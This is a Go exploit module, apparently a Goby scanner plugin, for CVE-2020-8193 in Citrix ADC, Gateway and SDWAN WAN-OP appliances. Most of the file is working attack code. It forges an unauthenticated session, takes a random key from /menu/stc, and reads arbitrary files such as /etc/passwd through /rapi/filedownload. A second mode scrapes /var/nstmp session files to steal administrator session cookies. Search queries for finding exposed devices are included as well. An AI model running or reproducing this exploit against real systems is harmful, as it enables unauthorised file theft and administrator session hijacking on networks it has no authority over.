package exploits

import (
	"crypto/tls"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Citrix System SDWAN WAN-OP Permission Bypass Vulnerability (CVE-2020-8193)",
    "Description": "<p>Citrix Systems Citrix System SDWAN WAN-OP is an SD-WAN (Virtual Software Defined Wide Area Network) device from Citrix Systems in the United States.</p><p>There is an authorization vulnerability in Citrix Systems Citrix ADC, Citrix Gateway, and Citrix SDWAN WAN-OP, which can be exploited by attackers to read sensitive system information without authentication.</p>",
    "Product": "citrix-Access-Gateway",
    "Homepage": "https://www.citrix.com/",
    "DisclosureDate": "2020-07-08",
    "PostTime": "2024-06-14",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "header=\"ns_af\" || header=\"NS-CACHE\" || header=\"Set-Cookie: citrix_ns_id\" || banner=\"NetScaler NS10.1\" || banner=\"NetScaler NS10.5\" || (title=\"Citrix Login\" && body=\"Netscape/Firefox/Opera\")",
    "GobyQuery": "header=\"ns_af\" || header=\"NS-CACHE\" || header=\"Set-Cookie: citrix_ns_id\" || banner=\"NetScaler NS10.1\" || banner=\"NetScaler NS10.5\" || (title=\"Citrix Login\" && body=\"Netscape/Firefox/Opera\")",
    "Level": "1",
    "Impact": "<p>There is an authorization vulnerability in Citrix Systems Citrix ADC, Citrix Gateway, and Citrix SDWAN WAN-OP, which can be exploited by attackers to read sensitive system information without authentication.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.citrix.com\">https://www.citrix.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://www.anquanke.com/post/id/210407"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "readFile",
            "show": ""
        },
        {
            "name": "readFile",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=readFile"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2020-8193"
    ],
    "CNNVD": [
        "CNNVD-202007-367"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Citrix System SDWAN WAN-OP 权限绕过漏洞（CVE-2020-8193）",
            "Product": "citrix-Access-Gateway",
            "Description": "<p>Citrix Systems Citrix System SDWAN WAN-OP是美国思杰系统（Citrix Systems）公司的一款SD-WAN（虚拟软件定义的广域网）设备。</p><p>Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在授权问题漏洞，攻击者可利用该漏洞未经身份验证，读取系统敏感信息。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.citrix.com\">https://www.citrix.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Citrix Systems Citrix ADC、Citrix Gateway和Citrix SDWAN WAN-OP中存在授权问题漏洞，攻击者可利用该漏洞未经身份验证，读取系统敏感信息。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Citrix System SDWAN WAN-OP Permission Bypass Vulnerability (CVE-2020-8193)",
            "Product": "citrix-Access-Gateway",
            "Description": "<p>Citrix Systems Citrix System SDWAN WAN-OP is an SD-WAN (Virtual Software Defined Wide Area Network) device from Citrix Systems in the United States.</p><p>There is an authorization vulnerability in Citrix Systems Citrix ADC, Citrix Gateway, and Citrix SDWAN WAN-OP, which can be exploited by attackers to read sensitive system information without authentication.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.citrix.com\">https://www.citrix.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is an authorization vulnerability in Citrix Systems Citrix ADC, Citrix Gateway, and Citrix SDWAN WAN-OP, which can be exploited by attackers to read sensitive system information without authentication.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10961"
}`

	// tcp读取文件 因为构建http请求头默认goscanne会把头的第一个字母大写
	readFileghjas8d783 := func(hostInfo *httpclient.FixUrl, route, cookie, key string) (string, error) {
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return "", err
		}

		if hostInfo.Scheme() == "https" {
			conn = tls.Client(conn, &tls.Config{
				MinVersion:         tls.VersionTLS10,
				InsecureSkipVerify: true,
			})
		}

		defer conn.Close()
		messageData := []byte("POST /rapi/filedownload?filter=path:" + url.QueryEscape(route) + " HTTP/1.1\r\n" +
			"Host: " + hostInfo.HostInfo + "\r\n" +
			"Cookie: " + cookie + "\r\n" +
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\n" +
			"rand_key: " + key + "\r\n" +
			"X-Nitro-Pass: " + goutils.RandomHexString(8) + "\r\n" +
			"X-Nitro-User: " + goutils.RandomHexString(8) + "\r\n" +
			"Content-Type: application/xml\r\n" +
			"Content-Length: 31\r\n" +
			"\r\n" +
			"<clipermission></clipermission>")
		_, err = conn.Write(messageData)
		buf := make([]byte, 1024)
		responseString := ""
		for {
			count, errs := conn.Read(buf)
			tmpMessageData := string(buf[0:count])
			responseString += tmpMessageData
			if errs != nil {
				break
			}
		}
		getDataSection := strings.Index(responseString, "\r\n\r\n")
		if getDataSection != -1 {
			return responseString[getDataSection+4:], nil
		}
		return "", err
	}

	// 获取随机密钥
	getRandKeydgas637812nmdsahjdg := func(hostInfo *httpclient.FixUrl, cookie string) (string, error) {
		getRandKeyRandRequestConfig := httpclient.NewGetRequestConfig("/menu/stc")
		getRandKeyRandRequestConfig.VerifyTls = false
		getRandKeyRandRequestConfig.FollowRedirect = false
		getRandKeyRandRequestConfig.Header.Store("Cookie", cookie)
		resp, err := httpclient.DoHttpRequest(hostInfo, getRandKeyRandRequestConfig)
		if err != nil {
			return "", err
		} else if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "var rand =") {
			match := regexp.MustCompile(`var rand = "([^"]+)"`).FindStringSubmatch(resp.Utf8Html)
			if len(match) < 2 {
				return "", errors.New("漏洞利用失败")
			}
			return match[1], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	// 修复会话
	fixSessionRanddsadbasnd8u321 := func(hostInfo *httpclient.FixUrl, cookie string) (*httpclient.HttpResponse, error) {
		fixSessionRandRequestConfig := httpclient.NewGetRequestConfig("/menu/ss?sid=nsroot&username=nsroot&force_setup=1")
		fixSessionRandRequestConfig.Header.Store("Cookie", cookie)
		fixSessionRandRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, fixSessionRandRequestConfig)
	}

	// 会话处理
	sessionProcessing := func(hostInfo *httpclient.FixUrl, cookie string) (*httpclient.HttpResponse, error) {
		createSessionRequestConfig := httpclient.NewPostRequestConfig("/pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1")
		createSessionRequestConfig.VerifyTls = false
		createSessionRequestConfig.FollowRedirect = false
		createSessionRequestConfig.Header.Store("Content-Type", "application/xml")
		createSessionRequestConfig.Header.Store("X-NITRO-USER", goutils.RandomHexString(8))
		createSessionRequestConfig.Header.Store("X-NITRO-PASS", goutils.RandomHexString(8))
		if len(cookie) > 2 {
			createSessionRequestConfig.Header.Store("Cookie", cookie)
		}
		createSessionRequestConfig.Data = "<appfwprofile><login></login></appfwprofile>"
		return httpclient.DoHttpRequest(hostInfo, createSessionRequestConfig)
	}

	// 文件读取
	createSession21dasjhdjqweqw := func(hostInfo *httpclient.FixUrl, route string) (string, string, string, error) {
		Cookie, err := sessionProcessing(hostInfo, "")
		if err != nil {
			return "", "", "", err
		} else if !(Cookie.StatusCode == 406 && strings.Contains(Cookie.Cookie, "SESSID")) {
			return "", "", "", errors.New("漏洞利用失败")
		}
		session := Cookie.Cookie

		Cookie, err = fixSessionRanddsadbasnd8u321(hostInfo, Cookie.Cookie)
		if err != nil {
			return "", "", "", err
		} else if !strings.Contains(Cookie.Cookie, "startupapp") {
			return "", "", "", errors.New("漏洞利用失败")
		}

		key, err := getRandKeydgas637812nmdsahjdg(hostInfo, session)
		if err != nil {
			return "", "", "", err
		} else if len(key) < 3 {
			return "", "", "", errors.New("漏洞利用失败")
		}

		resp, err := sessionProcessing(hostInfo, session)
		if err != nil {
			return "", "", "", err
		} else if !(resp.StatusCode == 406) {
			return "", "", "", errors.New("漏洞利用失败")
		}

		getData, err := readFileghjas8d783(hostInfo, route, session, key)
		if err != nil {
			return "", "", "", err
		} else if len(getData) > 2 {
			return getData, session, key, nil
		}
		return "", "", "", err
	}

	// 获取管理员 Cookie
	getHighPermissionCookiesdsa321bcmxzdas := func(hostInfo *httpclient.FixUrl) (string, error) {
		getData, cookie, key, err := createSession21dasjhdjqweqw(hostInfo, "/var/nstmp")
		if err != nil {
			return "", err
		} else if len(getData) < 2 {
			return "", err
		}
		matches := regexp.MustCompile(`sess_([0-9a-fA-F]{32})`).FindAllStringSubmatch(getData, -1)
		uniqueMatches := make(map[string]bool)
		for _, match := range matches {
			if len(match) > 1 {
				uniqueMatches[match[1]] = true
			}
		}
		availableSessions := ""
		for uniqueMatch := range uniqueMatches {
			getData, err = readFileghjas8d783(hostInfo, "/var/nstmp/sess_"+uniqueMatch, cookie, key)
			if !strings.Contains(getData, `NSAPI|s:254:`) {
				continue
			}
			randKey := regexp.MustCompile(`:\d+:"([0-9]+\.[0-9]+)";rand_key`).FindStringSubmatch(getData)
			if len(randKey) < 2 {
				continue
			}
			getData, err = readFileghjas8d783(hostInfo, "/etc/passwd", "SESSID="+uniqueMatch, randKey[1])
			if strings.Contains(getData, `root:`) {
				availableSessions += "Cookie: SESSID=" + uniqueMatch + "\n" + "rand_key: " + randKey[1] + "\n\n"
			}
		}
		if len(availableSessions) > 2 {
			return availableSessions, nil
		}
		return "", errors.New("管理员 Cookie 获取失败！")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _, _, err := createSession21dasjhdjqweqw(hostinfo, "/etc/passwd")
			if len(resp) > 2 && err == nil && strings.Contains(resp, `root:`) {
				stepLogs.VulURL = hostinfo.FixedHostInfo + "/pcidss/report"
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "getHighPrivilegeSession" {
				gitAdministratorSession, err := getHighPermissionCookiesdsa321bcmxzdas(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
					expResult.Success = false
				} else if len(gitAdministratorSession) > 1 {
					expResult.Output = gitAdministratorSession
					expResult.Success = true
				} else {
					expResult.Output = "漏洞利用失败"
					expResult.Success = false
				}
			} else if attackType == "readFile" {
				readFile := goutils.B2S(stepLogs.Params["readFile"])
				getData, _, _, err := createSession21dasjhdjqweqw(expResult.HostInfo, readFile)
				if err != nil {
					expResult.Output = err.Error()
				} else if len(getData) > 1 {
					expResult.Output = getData
					expResult.Success = true
				} else {
					expResult.Output = "漏洞利用失败"
					expResult.Success = false
				}
			}
			return expResult
		},
	))
}
